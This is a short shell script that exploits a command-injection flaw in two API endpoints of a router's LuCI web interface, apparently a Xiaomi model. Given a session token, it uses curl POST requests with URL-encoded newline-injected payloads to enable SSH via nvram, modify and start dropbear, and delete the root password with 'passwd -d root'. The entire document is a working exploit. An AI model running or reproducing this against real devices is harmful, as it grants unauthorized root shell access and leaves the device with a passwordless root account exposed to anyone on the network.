#!/bin/sh

if [ $# -ne 2 ]; then
cat <<EOF
Usage: $0 [misystem | xqsystem] [stok]
e.g. $0 xqsystem e6ea114ba2cddb0c70fbbc417bb2706c
Copy the stok-string from a browser's URL-line, while logged to the router
EOF
exit 1
fi

[ -z "$2" ] && echo "error: bad stok" && exit 1

ip="192.168.1.18"
url="http://${ip}/cgi-bin/luci/;stok=${2}/api"

case "$1" in
    misystem)
        url="$url/misystem/arn_switch"
        pre="open=1&model=1&level="
        suf=""
        ;;
    xqsystem)
        url="$url/xqsystem/start_binding"
        pre="uid=1234&key=1234'"
        suf="'"
        ;;
    *)
        echo "error: unknown api" && exit 1
        ;;
esac

curl -X POST "$url" -d "${pre}%0Anvram%20set%20ssh_en%3D1%0A${suf}"
sleep 1
curl -X POST "$url" -d "${pre}%0Anvram%20commit%0A${suf}"
sleep 1
curl -X POST "$url" -d "${pre}%0Ased%20-i%20's%2Fchannel%3D.*%2Fchannel%3D%22debug%22%2Fg'%20%2Fetc%2Finit.d%2Fdropbear%0A${suf}"
sleep 1
curl -X POST "$url" -d "${pre}%0A%2Fetc%2Finit.d%2Fdropbear%20start%0A${suf}"
sleep 1
curl -X POST "$url" -d "${pre}%0Apasswd%20-d%20root%0A${suf}"